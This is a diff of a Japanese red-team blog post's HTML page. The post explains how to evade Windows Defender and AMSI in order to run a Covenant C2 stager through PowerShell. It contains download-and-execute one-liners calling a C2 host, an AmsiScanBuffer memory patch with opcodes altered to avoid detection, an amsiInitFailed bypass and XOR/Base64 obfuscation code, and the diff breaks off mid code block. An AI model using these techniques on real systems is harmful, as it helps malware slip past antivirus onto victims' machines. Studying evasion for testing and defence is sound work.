@@ -2,7 +2,7 @@
 <html lang="ja-JP"><head>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<meta name="generator" content="Hugo 0.94.0-DEV" />
+	<meta name="generator" content="Hugo 0.68.3" />
 	
 	<link rel="icon" href="/img/favicon.ico">
 	
@@ -59,7 +59,7 @@
   "headline": "検知回避の手法 - PowerShell",
   "description" : "しゅーと(@shutingrz)です。 前回の記事では実行ファイルにおいて Windows Defender のリアルタイムスキャン、クラウド保護の検知回避を試みました。 まだ",
   "inLanguage" : "en",
-  "wordCount":  13264 ,
+  "wordCount":  13260 ,
   "datePublished" : "2021-04-10T00:00:00",
   "dateModified" : "2021-04-10T00:00:00",
   "image" : "https:\/\/www.shutingrz.com\/img\/favicon.ico",
@@ -80,42 +80,29 @@
 
 <meta property="og:title" content="検知回避の手法 - PowerShell" />
 <meta property="og:description" content="しゅーと(@shutingrz)です。 前回の記事では実行ファイルにおいて Windows Defender のリアルタイムスキャン、クラウド保護の検知回避を試みました。 まだ">
-
-
-
-
-<meta property="og:image" content="https://www.shutingrz.com/post/avoid-detection-powershell/cover.png" />
-
+<meta property="og:image" content="https://www.shutingrz.com/post/avoid-detection-powershell/images/cover.png" />
 <meta property="og:url" content="https://www.shutingrz.com/post/avoid-detection-powershell/" />
 <meta property="og:type" content="website" />
 <meta property="og:site_name" content="Shooting!!!" />
   <meta name="twitter:title" content="検知回避の手法 - PowerShell" />
   <meta name="twitter:description" content="しゅーと(@shutingrz)です。 前回の記事では実行ファイルにおいて Windows Defender のリアルタイムスキャン、クラウド保護の検知回避を試みました。 まだ">
-
-
-
-  <meta name="twitter:image" content="https://www.shutingrz.com/post/avoid-detection-powershell/cover.png" />
-
+  <meta name="twitter:image" content="https://www.shutingrz.com/post/avoid-detection-powershell/images/cover.png" />
   <meta name="twitter:card" content="summary" /> 
+	
 
 	<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
-	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp"
+	 crossorigin="anonymous">
 	<link href="https://fonts.googleapis.com/css?family=Righteous%7CMerriweather:300,300i,400,400i,700,700i" rel="stylesheet">
-
-	
-	<link rel="stylesheet" href="https://www.shutingrz.com/css/medium.ece05c3e0cb4c172303048d902f5c72734dac11b313a671c381a53648c811f4d.css" integrity="sha256-7OBcPgy0wXIwMEjZAvXHJzTawRsxOmccOBpTZIyBH00=">
-
-	
-	<link rel="stylesheet" href="https://www.shutingrz.com/css/additional.569f3996ca35a233f4c0bd5be50243eac6dc4238f8a2cc79fc5231c99323b016.css" integrity="sha256-Vp85lso1ojP0wL1b5QJD6sbcQjj4osx5/FIxyZMjsBY=">
+	<link href="/css/medium.css" rel="stylesheet">
+	<link href="/css/additional.css" rel="stylesheet">
 
 	
 	
-	<link rel="stylesheet" href="/css/additional.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/codeblock.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/code-default.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/table.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/custom-font.css" integrity="" crossorigin="anonymous" media="screen">
-	<link rel="stylesheet" href="/css/accordion.css" integrity="" crossorigin="anonymous" media="screen">
 </head>
 <body>
 <nav class="navbar navbar-expand-lg navbar-light bg-white fixed-top mediumnavigation nav-down">
@@ -219,21 +206,32 @@
                         </div>			
                         	
                         
-                                                
+                              
                         
                         <h1 class="posttitle">検知回避の手法 - PowerShell</h1> 
+                        
+                        <div class="after-post-tags">
+                            <ul class="tags">
+                            
+                            <li>
+                            <a href="/tags/pentest">pentest</a>
+                            </li>
+                            
+                            <li>
+                            <a href="/tags/bypass">bypass</a>
+                            </li>
+                            
+                            </ul>
+                        </div>
                     </div>
 
                     
-                    
-                    
-                        <img class="featured-image img-fluid" src="https://www.shutingrz.com/post/avoid-detection-powershell/cover.png" alt="thumbnail for this post">
+                        <img class="featured-image img-fluid" src="https://www.shutingrz.com/post/avoid-detection-powershell/images/cover.png" alt="thumbnail for this post">
                     
                     
 
                     
                     <div class="article-post">
-                        
                         <p>しゅーと(@shutingrz)です。</p>
 <p>前回の記事では実行ファイルにおいて Windows Defender のリアルタイムスキャン、クラウド保護の検知回避を試みました。</p>
 <p>まだ読んでない方はぜひ読んでください。</p>
@@ -259,15 +257,15 @@
 <p>PowerShell は Microsoft の誇るスクリプト言語で、ランタイムで、プログラムです。Windows10 では PowerShell のバージョン 5 がデフォルトでインストールされており、PowerShell を利用することでコンピュータのあらゆる操作が可能になります。しかしその強力さゆえ攻撃者による悪用が絶たないことからアンチウイルスベンダーも監視を強めており、こんにちでは PowerShell プログラムを利用したという時点でフラグが立つアンチウイルスソフト/ EDR も存在します。しかしながらいまだに Office マクロ経由で Powershell コマンドを実行させたり(Emotetなど複数マルウェア)、 powershell.exe を使わず PowerShell ランタイムを用いて Post-Exploitation用 PowerShell コードを利用する手法が存在しており(self contained custom PowerShell)、Red Team ではいまだに何らかの形でよく利用されます。</p>
 <p>本記事ではまず基本として、powershell.exe において Windows Defender を回避して Stager を動かすことを目標とします。</p>
 <h2 id="windows-defender-の検知ステップ">Windows Defender の検知ステップ</h2>
-<p><img src="images/amsi_structure.png" alt="amsi_structure" loading="lazy" /></p>
+<p><img src="images/amsi_structure.png" alt="amsi_structure"></p>
 <p>（<strong>図を確認しながら下の文章を読んでください</strong>）</p>
-<p>例えば&quot;<code>iex DownloadString('http://example.com/evil.ps1')</code>&ldquo;というコマンドレットを含むps1ファイルがある場合を考えます。。</p>
+<p>例えば&quot;<code>iex DownloadString('http://example.com/evil.ps1')</code>&quot;というコマンドレットを含むps1ファイルがある場合を考えます。。</p>
 <p>まずファイルが存在する場合は、ファイル作成時にアンチウイルスソフトがファイルを検査します。</p>
 <p>次に PowerShell で実行されたとき、PowerShellはファイルに含まれるコマンドレットを順次実行していきます。</p>
 <p>iex は Invoke-Expression の省略表現で、引数として存在する文字列を PowerShell コマンドレットとして評価し実行します。プログラミング言語でよくある「eval」です。引数は  <code>Net.WebClient.DownloadString</code> メソッドで、その引数として Stager のps1ファイルを指定しているとしましょう。このメソッドは指定したファイルをダウンロードし中身を文字列として扱うものです。さらにメソッドが括弧()で囲まれているため、メソッドの返り値が文字列展開され、ダウンロードした ps1 ファイルの中身が Invoke-Expression の引数として扱われます。結果として evil.ps1 に含まれるコードが実行されます。</p>
-<p>evil.ps1 の中に&rdquo; <code>iex (‘[Refrection.’+’Ass’+’embly]::’+’Load(“evil.dll”)’)</code> &ldquo;というコマンドレットが存在するとき、PowerShell は AMSI を通してアンチウイルスソフトに文字列をスキャンさせます。そのあと、文字列は分割されていますが、iexに引き渡されるころには結果として&rdquo;<code>[Refrection.Assembly]::Load(“evil.dll”)</code>&ldquo;という文字列になっています。</p>
+<p>evil.ps1 の中に&rdquo; <code>iex (‘[Refrection.’+’Ass’+’embly]::’+’Load(“evil.dll”)’)</code> &ldquo;というコマンドレットが存在するとき、PowerShell は AMSI を通してアンチウイルスソフトに文字列をスキャンさせます。そのあと、文字列は分割されていますが、iexに引き渡されるころには結果として&quot;<code>[Refrection.Assembly]::Load(“evil.dll”)</code>&quot;という文字列になっています。</p>
 <p>さらに現在の PowerShell は、IEX に渡される結合後(難読化解除後)のコードも AMSI を通してアンチウイルスソフトにスキャンさせます。</p>
-<p>最後に、&quot;<code>[Refrection.Assembly]::Load</code> &ldquo;によって、指定した .NET アセンブリがロードされます（<code>Assembly.Load()</code>と同じ動きです）。このとき、AMSI.dll の AMSIScanBuffer を通じてアセンブリをアンチウイルスソフトにスキャンさせます。</p>
+<p>最後に、&ldquo;<code>[Refrection.Assembly]::Load</code> &ldquo;によって、指定した .NET アセンブリがロードされます（<code>Assembly.Load()</code>と同じ動きです）。このとき、AMSI.dll の AMSIScanBuffer を通じてアセンブリをアンチウイルスソフトにスキャンさせます。</p>
 <p>これらのスキャン過程でファイルが無害と判断された場合、すべてが正常に完了します。</p>
 <h2 id="powershell-コンソールでの-stager-の起動">PowerShell コンソールでの Stager の起動</h2>
 <p>Covenant では Launcher 画面に PowerShell Launcher が存在しており、ここから PowerShell 用の Stager を取得可能です。</p>
@@ -277,44 +275,44 @@
 <h3 id="試しに-stager-を動かす">試しに Stager を動かす</h3>
 <p>まずはリアルタイムスキャンを無効にしたうえで、実際に Grunt がアクティベーションされることを確認しましょう。</p>
 <p>PowerShell Launcher にてGenerate ボタンを押すことで Stager のコードを含んだ PowerShell ワンライナーが生成されます。 EncodedLauncher のテキストボックスをコピーしPowerShellプロンプトに貼り付け、実行しましょう。</p>
-<p>なお&rdquo;<code>-Window Hidden</code>&ldquo;オプションは実行後ウインドウが消えてしまいます。バックグラウンドプロセスで動作するためステルス性が高まりますが、検証時には煩わしいためオプションを削除してから実行することをお勧めします。</p>
-<p><img src="images/covenant_pslauncher.png" alt="covenant_pslauncher" loading="lazy" /></p>
+<p>なお&quot;<code>-Window Hidden</code>&quot;オプションは実行後ウインドウが消えてしまいます。バックグラウンドプロセスで動作するためステルス性が高まりますが、検証時には煩わしいためオプションを削除してから実行することをお勧めします。</p>
+<p><img src="images/covenant_pslauncher.png" alt="covenant_pslauncher"></p>
 <p>実行すると Grunt がアクティベーションされます。</p>
 <p>また、プロンプトでワンライナーを行わなくとも、外部からps1ファイルをダウンロードし実行させることでも Stager を実行可能です。</p>
 <h3 id="外部から-stager-をダウンロードし実行する">外部から Stager をダウンロードし実行する</h3>
 <p>PowerShell Launcher の Host タブにて、Urlテキストボックスに「/ps_original.ps1」という文字列を入力して Host ボタンを押し、Stager の ps1ファイルをホスティングしましょう。</p>
-<p><img src="images/covenant_pslauncher._host.png" alt="covenant_pslauncher._host" loading="lazy" /></p>
+<p><img src="images/covenant_pslauncher._host.png" alt="covenant_pslauncher._host"></p>
 <p>ホスティングすると、同じく Host タブ下部 にある Launcher のテキストボックスが ps1ファイルをダウンロードして実行するようなコマンドに変化します。それをコピーして PowerShell コンソールに貼り付け、実行します。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-Sta</span> <span class="n">-Nop</span> <span class="n">-Command</span> <span class="s2">&#34;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.11.254/ps_original.ps1&#39;)&#34;</span>
-</span></span></code></pre></div><p>実行すると、Grunt がアクティベーションされます。</p>
-<p><img src="images/covenant_pslauncher_iex.png" alt="covenant_pslauncher_iex" loading="lazy" /></p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span> <span class="n">-Sta</span> <span class="n">-Nop</span> <span class="n">-Command</span> <span class="s2">&#34;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.11.254/ps_original.ps1&#39;)&#34;</span>
+</code></pre></div><p>実行すると、Grunt がアクティベーションされます。</p>
+<p><img src="images/covenant_pslauncher_iex.png" alt="covenant_pslauncher_iex"></p>
 <p>このコマンドレットによってダウンロードされるps1ファイルはディスクには保存されずメモリ上に展開されるため、リアルタイムスキャンのファイル検知、クラウド保護のファイル検知に検知されません。いわゆるファイルレス手法です。</p>
 <h3 id="リアルタイムスキャンをオンにして試す">リアルタイムスキャンをオンにして試す</h3>
 <p>では次にリアルタイムスキャンをオンにしてワンライナー同様の操作を行ってみましょう。</p>
 <blockquote>
 <p>ただし、<strong>クラウド保護、ファイル送信はオフのまま</strong>にしてください。</p>
 </blockquote>
-<p><img src="images/palauncher_amsi_detect.png" alt="palauncher_amsi_detect" loading="lazy" /></p>
+<p><img src="images/palauncher_amsi_detect.png" alt="palauncher_amsi_detect"></p>
 <p>検知され、実行に失敗しました。これは AMSI を通じて Windows Defender に検知されたことを示します。ただここで注目してほしいのは、<strong>検知されたポイントは DownloadString そのものではなく、ダウンロード後に展開された Stager コード部分である</strong>という点です。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">iex </span><span class="err">:</span> <span class="n">発生場所</span> <span class="n">行</span><span class="err">:</span><span class="n">1</span> <span class="n">文字</span><span class="err">:</span><span class="n">1</span>
-</span></span><span class="line"><span class="cl"><span class="p">+</span> <span class="nb">sv </span><span class="n">o</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">);</span><span class="nb">sv </span><span class="n">d</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">Def</span> <span class="p">...</span>
-</span></span><span class="line"><span class="cl"><span class="p">+</span> <span class="p">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
-</span></span><span class="line"><span class="cl"><span class="n">このスクリプトには</span><span class="err">、</span><span class="n">悪質なコンテンツが含まれているため</span><span class="err">、</span><span class="n">ウイルス対策ソフトウェアによりブロックされています</span><span class="err">。</span>
-</span></span></code></pre></div><p>つまり、初発の DownloadString で ps1 ファイルをダウンロードし iex で実行すること自体は、AMSIで検知されないということです。これは、外部からps1ファイルをダウンロードして実行するという行為が攻撃以外でも使われることがあるためです。これを利用する無害なソフトウェアの例として、Windows 上で動作するパッケージ管理ソフトウェア「chocolatey」のインストールスクリプトがあげられます。</p>
-<p><img src="images/iex_choco.png" alt="iex_choco" loading="lazy" /></p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">iex </span><span class="err">:</span> <span class="n">発生場所</span> <span class="n">行</span><span class="err">:</span><span class="n">1</span> <span class="n">文字</span><span class="err">:</span><span class="n">1</span>
+<span class="p">+</span> <span class="nb">sv </span><span class="n">o</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">);</span><span class="nb">sv </span><span class="n">d</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">Def</span> <span class="p">...</span>
+<span class="p">+</span> <span class="p">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+<span class="n">このスクリプトには</span><span class="err">、</span><span class="n">悪質なコンテンツが含まれているため</span><span class="err">、</span><span class="n">ウイルス対策ソフトウェアによりブロックされています</span><span class="err">。</span>
+</code></pre></div><p>つまり、初発の DownloadString で ps1 ファイルをダウンロードし iex で実行すること自体は、AMSIで検知されないということです。これは、外部からps1ファイルをダウンロードして実行するという行為が攻撃以外でも使われることがあるためです。これを利用する無害なソフトウェアの例として、Windows 上で動作するパッケージ管理ソフトウェア「chocolatey」のインストールスクリプトがあげられます。</p>
+<p><img src="images/iex_choco.png" alt="iex_choco"></p>
 <p>このように PowerShell は使い方によっては毒にも薬にもなるため、アンチウイルスベンダーも大変な思いをしているのです。</p>
 <h2 id="amsi-バイパス">AMSI バイパス</h2>
 <p>PowerShell を用いた侵害は、DownloadString と Invoke-Expression の組み合わせによってファイル検知を無視することができます。よって AMSI バイパスを行うだけで Windows Defender の検知回避は完了します。</p>
 <p>ただ重要なのは、AMSI バイパスのコードと Stager のデリバリーのタイミングです。<br>
 何も考えずに AMSI バイパスコードと Stager を同梱した ps1 ファイルを作成しても、AMSI によって検知されます。</p>
-<p><img src="images/staging_ng1.png" alt="staging_ng1" loading="lazy" /></p>
+<p><img src="images/staging_ng1.png" alt="staging_ng1"></p>
 <p>それなら全て検知されないようにAMSIバイパスコードとStagerを難読化しよう！と考えるかもしれません。はい、可能です。あなたがエキスパートならそれが一番スマートですが、難読化を解除するコードだったり、検知テスト検証の煩雑さから、初めからそれに挑戦するのはオススメしません。</p>
 <blockquote>
 <h4 id="invoke-obfuscation-の利用について">Invoke-Obfuscation の利用について</h4>
 <p>PowerShell スクリプトを簡単に難読化できる Invoke-Obfuscation というツールがあり、複数の文献で積極的に紹介されています。ただ現在ではこのツールで難読化されたコードは Windows Defender にて検知されることが多くなっているため、使い方には注意してください。</p>
 </blockquote>
 <p>それならまずは下の方法はいかがでしょうか。「AMSI バイパスを行い、Stagerをダウンロードし実行する」ps1ファイルと、Stagerのps1ファイルの2つを用意します。AMSIバイパスコードの検知回避さえできれば、そのあとにダウンロードし実行する Stagerスクリプトは AMSI バイパスによって常にクリーンになるため、検知されなくなります。この手法の短所はステージングにかかる回数が1回分増えることです。</p>
-<p><img src="images/pre_stage.png" alt="pre_stage" loading="lazy" /></p>
+<p><img src="images/pre_stage.png" alt="pre_stage"></p>
 <p>今回はこの方法を使って、検知回避について学びます。記事の最後になれば1ファイルで完結する方法も作れるようになると思いますよ。</p>
 <h3 id="バイパスコードの検知回避テクニック">バイパスコードの検知回避テクニック</h3>
 <p>AMSIバイパスの原理と手法はいくつか存在し、<a href="https://iwantmore.pizza/posts/amsi.html">phra氏のブログ</a>がメリットデメリットを合わせてわかりやすく説明してくれています。</p>
@@ -326,7 +324,7 @@
 <p>他にもよくある方法として、コードを分割し順序を入れ替えたり、エンコードしたうえで Invoke-Expression (IEX) で実行する難読化手法があげられます。この手法は昔は有効でしたが、今の PowerShell の AMSI エンジンは IEX 内部の難読化解除後のコードをスキャンするようになっているため、この方法を使った検知回避は<strong>限定的</strong>です。</p>
 <h4 id="amsiinitfailed-を用いたバイパスと注意点">amsiInitFailed を用いたバイパスと注意点</h4>
 <p>PowerShell において AMSI バイパスを行う一番有名な方法として、AmsiUtils クラスの amsiInitFailed 変数を true にして AMSI を停止させる手法があります。これは PowerShell において amsiInitFailed 変数が true だとコマンドレット実行時、AMSI がチェックを行わなくなる仕様を悪用したものです。バイパス手法には「1. 何らかの方法で AMSI のエラーを引き起こして true にする」タイプと、「2. リフレクションを使って実際に amsiInitFailed 変数そのものを true に設定する」タイプがあります。この手法は現在の PowerShell でも有効ですが、当然ながら未加工のバイパスコードだと AMSI によって検知されます。そこで難読化されたコードを作成する方法として手動で難読化するほか、上記のShitSecure氏のブログでは「<a href="https://amsi.fail/">AMSI.fail</a>」というサイトが紹介されています。</p>
-<p><img src="images/amsi_fail.png" alt="amsi_fail" loading="lazy" /></p>
+<p><img src="images/amsi_fail.png" alt="amsi_fail"></p>
 <p>ワンクリックで AMSI バイパスを行う処理を動的に難読化したコードを生成してくれます。利用する詳細テクニックはランダムに選ばれますが、原則として amsiInitFailed を true にして AMSI を使わないようにさせる手法が使われます。PowerShell において Windows Defender で検知を回避できる AMSI バイパスコードが欲しい場合はこれを使うと良いでしょう。</p>
 <blockquote>
 <p>作者のGithubには AMSI.fail のソースコードがありますが、Azure Functionとして実行する形式になっています。私はこれを .NET 4 + PowerShell v5 で実行できるように変更して利用しています。<br>
@@ -336,49 +334,49 @@
 <p>この手法は、 &ldquo;PowerShellランタイム&rdquo; において AMSI を動作させるかどうか決める変数を変えているだけなのです。<br>
 <strong>.NET 4.8 から AMSI は PowerShell だけではなく、読み込まれる.NET アセンブリをチェックする機能を備えるようになった</strong>ため、もうひと手間の工夫が必要です。</p>
 <p>Covenant の Stager PowerShell コードを読めばわかるとおり、Stager は最終的にコード内で <code>[Refrection.Assembly]::Load</code> (C#でいう Assembly.Load)を使って.NETアセンブリを読み込んでいます。Assembly.Load() が呼び出されたとき、AMSI は独立してアセンブリを AMSIScanBuffer に渡してチェックを行うため、 <strong>amsiInitFailed を用いたバイパスは効果がありません</strong>。</p>
-<p><img src="images/amsiinitfailed_structure.png" alt="amsiinitfailed_structure" loading="lazy" /></p>
-<p><img src="images/amsiinitfailed_trap.png" alt="amsiinitfailed_trap" loading="lazy" /></p>
+<p><img src="images/amsiinitfailed_structure.png" alt="amsiinitfailed_structure"></p>
+<p><img src="images/amsiinitfailed_trap.png" alt="amsiinitfailed_trap"></p>
 <p>よって amsiInitFailed を使った AMSI バイパス手法は PowerShell のコードに有効ですが、.NETアセンブリを読み込むAssembly.Load() には無力であると覚えておきましょう。</p>
 <h3 id="amsiscanbuffer-へのメモリパッチ">AMSIScanBuffer へのメモリパッチ</h3>
 <p>前回の記事でも利用した方法がこちらです。PowerShell プロセスに読み込まれる  AMSI 機能の実態である amsi.dll に存在する AMSIScanBuffer の関数アドレスの先頭を、常に安全なコードであることを示す「AMSI_RESULT_CLEAN」(0x80070057)を返すように、以下のオペコードでパッチします。</p>
-<pre tabindex="0"><code>mov    eax,0x80070057
+<pre><code>mov    eax,0x80070057
 ret
 </code></pre><p>こうすることでAMSIは全てのコンテンツをAMSIプロバイダーに渡さずに即座にクリーンと誤認します。詳しくはRastaMouse氏の<a href="https://rastamouse.me/blog/asb-bypass-pt3/">ブログ投稿</a>をお読みください。</p>
 <p>これを使うことで、Powershell プロセスにおける全ての AMSI 関連機能が無害化されます。</p>
 <h4 id="バイパスコードと検知回避">バイパスコードと検知回避</h4>
 <p>AMSIScanBuffer を用いた AMSI バイパスには、RastaMouse氏の <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass">AMSIScanBufferBypass (ASBBypass)</a> を利用することにします。</p>
 <p>ASBBypass には PowerShell 実装と C# 実装が存在します。Powershell で使うなら PowerShell 実装が一番楽です。</p>
-<p><img src="images/asbbypass_ps1.png" alt="asbbypass_ps1" loading="lazy" /></p>
+<p><img src="images/asbbypass_ps1.png" alt="asbbypass_ps1"></p>
 <p>ただし、当然ながらこのコードをそのまま使うと AMSI によって検知されます。</p>
-<p><img src="images/asbbypass_raw_detect.png" alt="asbbypass_raw_detect" loading="lazy" /></p>
+<p><img src="images/asbbypass_raw_detect.png" alt="asbbypass_raw_detect"></p>
 <p>前回の実行ファイルの検知回避ではアンマネージドコードを利用することで、AMSIによるチェックなしにAMSIバイパスができましたが、今回はPowerShell上で行うため検知回避が必須です。</p>
 <p>検知状況の確認には<a href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a>がお勧めです。このツールはテキストあるいはURLを指定してデータを AMSIScanBuffer に送信することで、どの部分で検知されたかを可視化してくれるツールです。本記事ではよく使うのでダウンロードしてください。</p>
-<p><img src="images/amsitrigger.png" alt="amsitrigger" loading="lazy" /></p>
+<p><img src="images/amsitrigger.png" alt="amsitrigger"></p>
 <p>AMSITriggerで赤く表示されたコードを中心に、処理を変えないように表現を変え、そして変えたファイルに対して改めて AmsiTrigger をかけていくことを繰り返して、最終的に検知回避されたコードを作成していきます。</p>
 <p>文字列を変化させるような検知回避手法については<a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">ShitSecure氏のブログ</a>(再掲)に記述されており、複数の正解があります。やり方は読者のあなたに任せるとして、私はパッチする内容を変化させる<a href="https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/">Fat氏の投稿</a>を参考に検知回避を試みました。</p>
-<p><img src="images/asbbypass_patch.png" alt="asbbypass_patch" loading="lazy" /></p>
+<p><img src="images/asbbypass_patch.png" alt="asbbypass_patch"></p>
 <p>AMSIScanBuffer の文字列は hex に変化させる単純な置換で、肝心なメモリパッチのアセンブリは以下にしました。</p>
-<pre tabindex="0"><code class="language-assembly" data-lang="assembly">xor    eax,eax
+<pre><code class="language-assembly" data-lang="assembly">xor    eax,eax
 add    eax,0x1000cafe
 add    eax,0x70063559
 ret 
 </code></pre><p>結局 0x80070057 を ret するようなアセンブリであれば何でもいいのです。皆さんも好きなアセンブリを作ってバイパスをしてみましょう。</p>
 <p>作成したコードを AMSITrigger にかけると検知されませんでした。実際に PowerShell でバイパスしたあと WinDbgでAMSIScanBufferの関数アドレスを表示すると、先頭のアセンブリが変わっていることがわかります。</p>
-<p><img src="images/windbg_view_patch.png" alt="windbg_view_patch" loading="lazy" /></p>
+<p><img src="images/windbg_view_patch.png" alt="windbg_view_patch"></p>
 <p>試しにWinDbgでAmsiScanBufferのretにブレークポイントを仕掛けて、raxの値が 0x80070057 になり、検知が回避されることを確認しましょう。ちなみに「amsiscanbuffer」という文字列は PowerShell で実行すると、通常は AMSI によって検知され、ブロックされた旨のエラーが表示されます。</p>
-<p><img src="images/windbg_view_rax.png" alt="windbg_view_rax" loading="lazy" /></p>
+<p><img src="images/windbg_view_rax.png" alt="windbg_view_rax"></p>
 <p>パッチ後はrax に 0x80070057 が格納されており、PowerShellの実行結果でも「amsiscanbuffer」が検知されていないことがわかります。</p>
 <p>これまでAMSIバイパスを図で表すと、以下になります(2つのCLEANの部分)。</p>
-<p><img src="images/amsiscanbuffer_patch_structure.png" alt="amsiscanbuffer_patch_structure" loading="lazy" /></p>
+<p><img src="images/amsiscanbuffer_patch_structure.png" alt="amsiscanbuffer_patch_structure"></p>
 <p>難読化ツールを使わなくても AMSI を検知回避しつつ AMSI バイパスをするコードができました。（ただしクラウド保護はオフの状態で。）</p>
 <h3 id="pre-stagerの作成">Pre Stagerの作成</h3>
 <p>AMSI バイパスコードができあがったので、AMSIバイパスしたうえでStagerをダウンロードし実行する、「Pre Stager」を作成します。といっても、作成したAMSIバイパスコードの下に Stagerをダウンロードし実行するコードを追記するだけです。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.11.254/ps_original.ps1&#39;</span><span class="p">)</span>
-</span></span></code></pre></div><p>しかし、ここでも注意点があります。</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.11.254/ps_original.ps1&#39;</span><span class="p">)</span>
+</code></pre></div><p>しかし、ここでも注意点があります。</p>
 <h4 id="クラウド保護の動的シグネチャ作成に注意">クラウド保護の動的シグネチャ作成に注意</h4>
 <p>DownloadString + IEX の組み合わせはそれ自身ではアンチウイルスソフトには検知されませんが、一度 DownloadString でダウンロードしたファイルが AMSI によって検知された場合、Windows Defender は一定時間、該当ホストから DownloadString でダウンロードして iex を実行させるようなコードを全てブロックするような挙動を示します。</p>
 <p>わかりやすい例を示しましょう。下の画像を見てください。</p>
-<p><img src="images/wd_makesig.png" alt="wd_makesig" loading="lazy" /></p>
+<p><img src="images/wd_makesig.png" alt="wd_makesig"></p>
 <p>該当URLの中身は Hello! と出力するだけの無害なファイルにも関わらず、DownloadString のコマンドレットの時点で検知されています（ps1ファイルのダウンロードもしません！）</p>
 <p>これはクラウド保護の動的シグネチャ作成機能によるものです。シグネチャの検知条件となる文字列の選定は機械学習によって生成されるようですが、この場合は大抵検知箇所として、iex からURLのホスト名である <code>192.168.11.254/</code>までの文字列が検知対象になっている模様です。なお他のホスト名には問題なくアクセスできました。</p>
 <blockquote>
@@ -391,52 +389,52 @@ ret
 <p>オリジナルのInvoke-Obfuscation を使いたいときは、必ず AmsiTrigger を使って難読化後のコードに対して検知テストをしてください。（そのままだと検知されるパターンが割とあります）</p>
 </blockquote>
 <p>Base64 + XOR で暗号化するコードは以下です。0x64 は好きなバイトに、<code>&lt;paste here&gt;</code>は対象コードに変えてください。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$key</span> <span class="p">=</span> <span class="n">0x64</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="p">=</span> <span class="s2">&#34;&lt;paste here&gt;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Bytes</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$enc</span> <span class="p">=</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$byte</span> <span class="k">in</span> <span class="nv">$Bytes</span><span class="p">){</span><span class="nv">$byte</span> <span class="o">-bxor</span> <span class="nv">$key</span><span class="p">};</span>
-</span></span><span class="line"><span class="cl"><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$enc</span><span class="p">)</span> <span class="p">|</span> <span class="n">clip</span>
-</span></span></code></pre></div><p>なお復号コードとして以下を使います。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$key</span> <span class="p">=</span> <span class="n">0x64</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$payload</span> <span class="p">=</span> <span class="s2">&#34;&lt;paste here&gt;&#34;</span><span class="p">;</span>
